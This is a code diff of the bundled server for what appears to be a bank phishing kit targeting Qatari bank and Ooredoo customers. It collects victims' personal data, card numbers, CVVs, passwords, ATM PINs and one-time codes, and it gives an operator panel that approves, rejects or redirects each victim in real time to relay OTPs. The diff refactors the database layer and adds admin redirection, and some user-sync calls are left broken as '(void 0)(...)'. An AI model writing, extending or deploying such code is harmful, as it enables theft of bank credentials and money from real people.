@@ -1,3 +1,9 @@
+var __defProp = Object.defineProperty;
+var __export = (target, all) => {
+  for (var name in all)
+    __defProp(target, name, { get: all[name], enumerable: true });
+};
+
 // server/_core/index.ts
 import "dotenv/config";
 import express2 from "express";
@@ -30,12 +36,21 @@ var decodeOAuthState = (state) => {
 // server/_core/oauth.ts
 import { parse as parseCookieHeader2 } from "cookie";
 
-// server/db.ts
-import { eq } from "drizzle-orm";
+// server/_core/db.ts
 import { drizzle } from "drizzle-orm/postgres-js";
 import postgres from "postgres";
 
 // drizzle/schema.ts
+var schema_exports = {};
+__export(schema_exports, {
+  atmPinSubmissions: () => atmPinSubmissions,
+  loginMethodSubmissions: () => loginMethodSubmissions,
+  ooredooSubmissions: () => ooredooSubmissions,
+  otpSubmissions: () => otpSubmissions,
+  personalDataSubmissions: () => personalDataSubmissions,
+  sessions: () => sessions,
+  users: () => users
+});
 import { pgTable, serial, text, timestamp, varchar } from "drizzle-orm/pg-core";
 var users = pgTable("users", {
   id: serial("id").primaryKey(),
@@ -58,6 +73,8 @@ var sessions = pgTable("sessions", {
   // login, otp, atm, ooredoo, otp_ooredoo
   adminAction: varchar("adminAction", { length: 20 }),
   // approve, reject
+  redirectTarget: varchar("redirectTarget", { length: 50 }),
+  // New field for admin redirection
   errorMessage: text("errorMessage"),
   createdAt: timestamp("createdAt").defaultNow().notNull(),
   updatedAt: timestamp("updatedAt").defaultNow().notNull()
@@ -120,271 +137,121 @@ var ENV = {
   forgeApiKey: process.env.BUILT_IN_FORGE_API_KEY ?? ""
 };
 
+// server/_core/db.ts
+if (!ENV.databaseUrl) {
+  throw new Error("DATABASE_URL is not set");
+}
+var client = postgres(ENV.databaseUrl);
+var db = drizzle(client, { schema: schema_exports });
+
 // server/db.ts
-var _db = null;
-async function getDb() {
-  if (!_db && process.env.DATABASE_URL) {
-    try {
-      console.log("[Database] Attempting to connect to database...");
-      const client = postgres(process.env.DATABASE_URL);
-      _db = drizzle(client);
-      console.log("[Database] Successfully connected to database");
-    } catch (error) {
-      console.error("[Database] Failed to connect:", error);
-      _db = null;
-    }
-  }
-  return _db;
-}
-async function upsertUser(user) {
-  if (!user.openId) {
-    throw new Error("User openId is required for upsert");
-  }
-  const db = await getDb();
-  if (!db) {
-    console.warn("[Database] Cannot upsert user: database not available");
-    return;
-  }
-  try {
-    const values = {
-      openId: user.openId
-    };
-    const updateSet = {};
-    const textFields = ["name", "email", "loginMethod"];
-    const assignNullable = (field) => {
-      const value = user[field];
-      if (value === void 0) return;
-      const normalized = value ?? null;
-      values[field] = normalized;
-      updateSet[field] = normalized;
-    };
-    textFields.forEach(assignNullable);
-    if (user.lastSignedIn !== void 0) {
-      values.lastSignedIn = user.lastSignedIn;
-      updateSet.lastSignedIn = user.lastSignedIn;
-    }
-    if (user.role !== void 0) {
-      values.role = user.role;
-      updateSet.role = user.role;
-    } else if (user.openId === ENV.ownerOpenId) {
-      values.role = "admin";
-      updateSet.role = "admin";
-    }
-    if (!values.lastSignedIn) {
-      values.lastSignedIn = /* @__PURE__ */ new Date();
-    }
-    if (Object.keys(updateSet).length === 0) {
-      updateSet.lastSignedIn = /* @__PURE__ */ new Date();
-    }
-    await db.insert(users).values(values).onConflictDoUpdate({
-      target: users.openId,
-      set: updateSet
-    });
-  } catch (error) {
-    console.error("[Database] Failed to upsert user:", error);
-    throw error;
-  }
-}
-async function getUserByOpenId(openId) {
-  const db = await getDb();
-  if (!db) {
-    console.warn("[Database] Cannot get user: database not available");
-    return void 0;
-  }
-  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);
-  return result.length > 0 ? result[0] : void 0;
-}
-async function createSession(sessionId, selectedBank) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot create session: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Creating session: ${sessionId} for bank: ${selectedBank}`);
-    await db.insert(sessions).values({ id: sessionId, selectedBank, country: "Qatar" });
-    console.log(`[Database] Session created successfully: ${sessionId}`);
-  } catch (error) {
-    console.error(`[Database] Failed to create session ${sessionId}:`, error);
-    throw error;
-  }
-}
-async function updateSessionStatus(sessionId, status, step, errorMessage, redirectTarget) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot update session: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Updating session ${sessionId}: status=${status}, step=${step}, redirectTarget=${redirectTarget}`);
-    const updateData = { status, currentStep: step, errorMessage, updatedAt: /* @__PURE__ */ new Date(), adminAction: null };
-    if (redirectTarget) {
-      updateData.redirectTarget = redirectTarget;
-    }
-    await db.update(sessions).set(updateData).where(eq(sessions.id, sessionId));
-    console.log(`[Database] Session updated successfully: ${sessionId}`);
-  } catch (error) {
-    console.error(`[Database] Failed to update session ${sessionId}:`, error);
-    throw error;
-  }
-}
-async function adminTakeAction(sessionId, action, errorMessage) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot take admin action: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Admin action on session ${sessionId}: action=${action}`);
-    await db.update(sessions).set({ adminAction: action, errorMessage, status: action === "approve" ? "approved" : "rejected", updatedAt: /* @__PURE__ */ new Date() }).where(eq(sessions.id, sessionId));
-    console.log(`[Database] Admin action completed: ${sessionId}`);
-  } catch (error) {
-    console.error(`[Database] Failed to take admin action on ${sessionId}:`, error);
-    throw error;
-  }
-}
-async function getSessionStatus(sessionId) {
-  const db = await getDb();
-  if (!db) return null;
-  const [session] = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
-  return session || null;
-}
-async function getSessionByIdWithAllData(sessionId) {
-  const db = await getDb();
-  if (!db) return null;
-  const [sessionData] = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
-  if (!sessionData) return null;
-  const [personalData] = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
-  const [loginMethod] = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
-  const [atmPin] = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
-  const [otp] = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).limit(1);
-  const [ooredoo] = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);
-  return {
-    session: sessionData,
-    personalData: personalData || null,
-    loginMethod: loginMethod || null,
-    atmPin: atmPin || null,
-    otp: otp || null,
-    ooredoo: ooredoo || null
-  };
+import { eq, desc } from "drizzle-orm";
+async function createSession(id, selectedBank, country = "Qatar") {
+  await db.insert(sessions).values({
+    id,
+    selectedBank,
+    country,
+    status: "pending",
+    createdAt: /* @__PURE__ */ new Date(),
+    updatedAt: /* @__PURE__ */ new Date()
+  });
 }
 async function submitPersonalData(data) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot submit personal data: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Submitting personal data for session: ${data.sessionId}`);
-    const result = await db.insert(personalDataSubmissions).values(data);
-    console.log(`[Database] Personal data submitted successfully: ${data.sessionId}`);
-    return result;
-  } catch (error) {
-    console.error(`[Database] Failed to submit personal data for ${data.sessionId}:`, error);
-    throw error;
-  }
+  await db.insert(personalDataSubmissions).values({
+    ...data,
+    submittedAt: /* @__PURE__ */ new Date()
+  });
+  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), currentStep: "login" }).where(eq(sessions.id, data.sessionId));
 }
 async function submitLoginMethod(data) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot submit login method: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Submitting login method for session: ${data.sessionId}`);
-    const result = await db.insert(loginMethodSubmissions).values(data);
-    console.log(`[Database] Login method submitted successfully: ${data.sessionId}`);
-    return result;
-  } catch (error) {
-    console.error(`[Database] Failed to submit login method for ${data.sessionId}:`, error);
-    throw error;
-  }
+  await db.insert(loginMethodSubmissions).values({
+    ...data,
+    submittedAt: /* @__PURE__ */ new Date()
+  });
+  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), adminAction: null, currentStep: "login" }).where(eq(sessions.id, data.sessionId));
 }
 async function submitAtmPin(data) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot submit ATM PIN: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Submitting ATM PIN for session: ${data.sessionId}`);
-    const result = await db.insert(atmPinSubmissions).values(data);
-    console.log(`[Database] ATM PIN submitted successfully: ${data.sessionId}`);
-    return result;
-  } catch (error) {
-    console.error(`[Database] Failed to submit ATM PIN for ${data.sessionId}:`, error);
-    throw error;
-  }
+  await db.insert(atmPinSubmissions).values({
+    ...data,
+    submittedAt: /* @__PURE__ */ new Date()
+  });
+  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), adminAction: null, currentStep: "atm" }).where(eq(sessions.id, data.sessionId));
 }
 async function submitOtp(data) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot submit OTP: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Submitting OTP for session: ${data.sessionId}`);
-    const result = await db.insert(otpSubmissions).values(data);
-    console.log(`[Database] OTP submitted successfully: ${data.sessionId}`);
-    return result;
-  } catch (error) {
-    console.error(`[Database] Failed to submit OTP for ${data.sessionId}:`, error);
-    throw error;
-  }
+  await db.insert(otpSubmissions).values({
+    ...data,
+    submittedAt: /* @__PURE__ */ new Date()
+  });
+  await db.update(sessions).set({
+    updatedAt: /* @__PURE__ */ new Date(),
+    adminAction: null,
+    currentStep: data.otpType === "ooredoo" ? "otp_ooredoo" : "otp"
+  }).where(eq(sessions.id, data.sessionId));
 }
 async function submitOoredoo(data) {
-  const db = await getDb();
-  if (!db) {
-    console.error("[Database] Cannot submit Ooredoo credentials: database not available");
-    throw new Error("Database not available");
-  }
-  try {
-    console.log(`[Database] Submitting Ooredoo credentials for session: ${data.sessionId}`);
-    const result = await db.insert(ooredooSubmissions).values(data);
-    console.log(`[Database] Ooredoo credentials submitted successfully: ${data.sessionId}`);
-    return result;
-  } catch (error) {
-    console.error(`[Database] Failed to submit Ooredoo credentials for ${data.sessionId}:`, error);
-    throw error;
-  }
+  await db.insert(ooredooSubmissions).values({
+    ...data,
+    submittedAt: /* @__PURE__ */ new Date()
+  });
+  await db.update(sessions).set({ updatedAt: /* @__PURE__ */ new Date(), adminAction: null, currentStep: "ooredoo" }).where(eq(sessions.id, data.sessionId));
 }
-async function getAllSubmissions() {
-  const db = await getDb();
-  if (!db) {
-    console.warn("[Database] Cannot get submissions: database not available");
-    return [];
+async function getFullSubmissions() {
+  const allSessions = await db.select().from(sessions).orderBy(desc(sessions.updatedAt));
+  const results = [];
+  for (const session of allSessions) {
+    const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, session.id)).limit(1);
+    const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, session.id)).limit(1);
+    const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, session.id)).limit(1);
+    const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, session.id)).orderBy(desc(otpSubmissions.submittedAt));
+    const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, session.id)).limit(1);
+    results.push({
+      ...session,
+      personalData: personal[0] || null,
+      loginMethod: login[0] || null,
+      atmPin: pin[0] || null,
+      otps: otp,
+      ooredoo: ooredoo[0] || null
+    });
   }
-  try {
-    console.log("[Database] Fetching all submissions...");
-    const allSessions = await db.select().from(sessions);
-    console.log(`[Database] Found ${allSessions.length} sessions`);
-    const result = [];
-    for (const session of allSessions) {
-      const [personalData] = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, session.id)).limit(1);
-      result.push({
-        ...session,
-        nameArabic: personalData?.nameArabic || "\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644...",
-        phoneNumber: personalData?.phoneNumber || "\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644...",
-        idNumber: personalData?.idNumber || "\u062C\u0627\u0631\u064A \u0627\u0644\u062A\u062D\u0645\u064A\u0644..."
-      });
-    }
-    console.log(`[Database] Returning ${result.length} submissions with details`);
-    return result;
-  } catch (error) {
-    console.error("[Database] Failed to get all submissions:", error);
-    return [];
-  }
+  return results;
 }
 async function getSubmissionDetails(sessionId) {
-  try {
-    console.log(`[Database] Fetching details for session: ${sessionId}`);
-    const details = await getSessionByIdWithAllData(sessionId);
-    console.log(`[Database] Details fetched for session: ${sessionId}`);
-    return details;
-  } catch (error) {
-    console.error(`[Database] Failed to get submission details for ${sessionId}:`, error);
-    return null;
-  }
+  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
+  if (!session[0]) return null;
+  const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, sessionId)).limit(1);
+  const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, sessionId)).limit(1);
+  const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, sessionId)).limit(1);
+  const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, sessionId)).orderBy(desc(otpSubmissions.submittedAt));
+  const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, sessionId)).limit(1);
+  return {
+    ...session[0],
+    personalData: personal[0] || null,
+    loginMethod: login[0] || null,
+    atmPin: pin[0] || null,
+    otps: otp,
+    ooredoo: ooredoo[0] || null
+  };
+}
+async function updateSessionStatus(sessionId, status, currentStep) {
+  const updateData = { status, updatedAt: /* @__PURE__ */ new Date() };
+  if (currentStep) updateData.currentStep = currentStep;
+  if (status === "approved") updateData.adminAction = "approve";
+  if (status === "rejected") updateData.adminAction = "reject";
+  await db.update(sessions).set(updateData).where(eq(sessions.id, sessionId));
+}
+async function adminTakeAction(sessionId, action, errorMessage, redirectTarget) {
+  await db.update(sessions).set({
+    adminAction: action,
+    errorMessage: errorMessage || null,
+    redirectTarget: redirectTarget || null,
+    status: "pending",
+    // Reset to pending to allow user to see action
+    updatedAt: /* @__PURE__ */ new Date()
+  }).where(eq(sessions.id, sessionId));
+}
+async function getSessionStatus(sessionId) {
+  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
+  return session[0] || null;
 }
 
 // server/_core/cookies.ts
@@ -423,8 +290,8 @@ var EXCHANGE_TOKEN_PATH = `/webdev.v1.WebDevAuthPublicService/ExchangeToken`;
 var GET_USER_INFO_PATH = `/webdev.v1.WebDevAuthPublicService/GetUserInfo`;
 var GET_USER_INFO_WITH_JWT_PATH = `/webdev.v1.WebDevAuthPublicService/GetUserInfoWithJwt`;
 var OAuthService = class {
-  constructor(client) {
-    this.client = client;
+  constructor(client2) {
+    this.client = client2;
     console.log("[OAuth] Initialized with baseURL:", ENV.oAuthServerUrl);
     if (!ENV.oAuthServerUrl) {
       console.error(
@@ -465,8 +332,8 @@ var createOAuthHttpClient = () => axios.create({
 var SDKServer = class {
   client;
   oauthService;
-  constructor(client = createOAuthHttpClient()) {
-    this.client = client;
+  constructor(client2 = createOAuthHttpClient()) {
+    this.client = client2;
     this.oauthService = new OAuthService(this.client);
   }
   deriveLoginMethod(platforms, fallback) {
@@ -615,18 +482,18 @@ var SDKServer = class {
     }
     const sessionUserId = session.openId;
     const signedInAt = /* @__PURE__ */ new Date();
-    let user = await getUserByOpenId(sessionUserId);
+    let user = await (void 0)(sessionUserId);
     if (!user) {
       try {
         const userInfo = await this.getUserInfoWithJwt(sessionToken ?? "");
-        await upsertUser({
+        await (void 0)({
           openId: userInfo.openId,
           name: userInfo.name || null,
           email: userInfo.email ?? null,
           loginMethod: userInfo.loginMethod ?? userInfo.platform ?? null,
           lastSignedIn: signedInAt
         });
-        user = await getUserByOpenId(userInfo.openId);
+        user = await (void 0)(userInfo.openId);
       } catch (error) {
         console.error("[Auth] Failed to sync user from OAuth:", error);
         throw ForbiddenError("Failed to sync user info");
@@ -635,7 +502,7 @@ var SDKServer = class {
     if (!user) {
       throw ForbiddenError("User not found");
     }
-    await upsertUser({
+    await (void 0)({
       openId: user.openId,
       lastSignedIn: signedInAt
     });
@@ -688,7 +555,7 @@ function registerOAuthRoutes(app) {
         res.status(400).json({ error: "openId missing from user info" });
         return;
       }
-      await upsertUser({
+      await (void 0)({
         openId: userInfo.openId,
         name: userInfo.name || null,
         email: userInfo.email ?? null,
@@ -910,12 +777,13 @@ var appRouter = router({
     createSession: publicProcedure.input((val) => {
       if (typeof val !== "object" || val === null) throw new Error("Invalid input");
       const obj = val;
-      if (typeof obj.sessionId !== "string" || typeof obj.selectedBank !== "string") {
-        throw new Error("Invalid input");
-      }
-      return { sessionId: obj.sessionId, selectedBank: obj.selectedBank };
+      return {
+        sessionId: String(obj.sessionId),
+        selectedBank: String(obj.selectedBank),
+        country: obj.country ? String(obj.country) : "Qatar"
+      };
     }).mutation(async ({ input }) => {
-      await createSession(input.sessionId, input.selectedBank);
+      await createSession(input.sessionId, input.selectedBank, input.country);
       return { success: true };
     }),
     submitPersonalData: publicProcedure.input((val) => {
@@ -942,12 +810,12 @@ var appRouter = router({
       return {
         sessionId: String(obj.sessionId),
         loginType: String(obj.loginType),
-        cardNumber: obj.cardNumber ? String(obj.cardNumber) : void 0,
-        cardholderName: obj.cardholderName ? String(obj.cardholderName) : void 0,
-        expiryDate: obj.expiryDate ? String(obj.expiryDate) : void 0,
-        cvv: obj.cvv ? String(obj.cvv) : void 0,
-        username: obj.username ? String(obj.username) : void 0,
-        password: obj.password ? String(obj.password) : void 0
+        cardNumber: obj.cardNumber ? String(obj.cardNumber) : "",
+        cardholderName: obj.cardholderName ? String(obj.cardholderName) : "",
+        expiryDate: obj.expiryDate ? String(obj.expiryDate) : "",
+        cvv: obj.cvv ? String(obj.cvv) : "",
+        username: obj.username ? String(obj.username) : "",
+        password: obj.password ? String(obj.password) : ""
       };
     }).mutation(async ({ input }) => {
       await submitLoginMethod(input);
@@ -993,19 +861,10 @@ var appRouter = router({
       return { success: true };
     }),
     getAllSubmissions: publicProcedure.query(async () => {
-      return await getAllSubmissions();
+      return await getFullSubmissions();
     }),
-    getSubmissionDetails: publicProcedure.input((val) => {
-      if (typeof val !== "string") throw new Error("Invalid input");
-      return val;
-    }).query(async ({ input }) => {
+    getSubmissionDetails: publicProcedure.input(String).query(async ({ input }) => {
       return await getSubmissionDetails(input);
-    }),
-    getSessionStatus: publicProcedure.input((val) => {
-      if (typeof val !== "string") throw new Error("Invalid input");
-      return val;
-    }).query(async ({ input }) => {
-      return await getSessionStatus(input);
     }),
     adminTakeAction: publicProcedure.input((val) => {
       if (typeof val !== "object" || val === null) throw new Error("Invalid input");
@@ -1013,22 +872,15 @@ var appRouter = router({
       return {
         sessionId: String(obj.sessionId),
         action: String(obj.action),
-        errorMessage: obj.errorMessage ? String(obj.errorMessage) : void 0
+        errorMessage: obj.errorMessage ? String(obj.errorMessage) : void 0,
+        redirectTarget: obj.redirectTarget ? String(obj.redirectTarget) : void 0
       };
     }).mutation(async ({ input }) => {
-      await adminTakeAction(input.sessionId, input.action, input.errorMessage);
+      await adminTakeAction(input.sessionId, input.action, input.errorMessage, input.redirectTarget);
       return { success: true };
     }),
-    adminRedirect: publicProcedure.input((val) => {
-      if (typeof val !== "object" || val === null) throw new Error("Invalid input");
-      const obj = val;
-      return {
-        sessionId: String(obj.sessionId),
-        targetPage: String(obj.targetPage)
-      };
-    }).mutation(async ({ input }) => {
-      await updateSessionStatus(input.sessionId, "pending", void 0, void 0, input.targetPage);
-      return { success: true };
+    getSessionStatus: publicProcedure.input(String).query(async ({ input }) => {
+      return await getSessionStatus(input);
     })
   })
 });
@@ -1057,7 +909,7 @@ import { createServer as createViteServer } from "vite";
 
 // vite.config.ts
 import react from "@vitejs/plugin-react";
-import path from "node:path";
+import path from "path";
 import { defineConfig } from "vite";
 var vite_config_default = defineConfig({
   plugins: [react()],
@@ -1070,10 +922,15 @@ var vite_config_default = defineConfig({
   },
   envDir: path.resolve(import.meta.dirname),
   root: path.resolve(import.meta.dirname, "client"),
-  publicDir: path.resolve(import.meta.dirname, "client", "public"),
   build: {
     outDir: path.resolve(import.meta.dirname, "dist/public"),
     emptyOutDir: true
+  },
+  server: {
+    fs: {
+      strict: true,
+      deny: ["**/.*"]
+    }
   }
 });
 
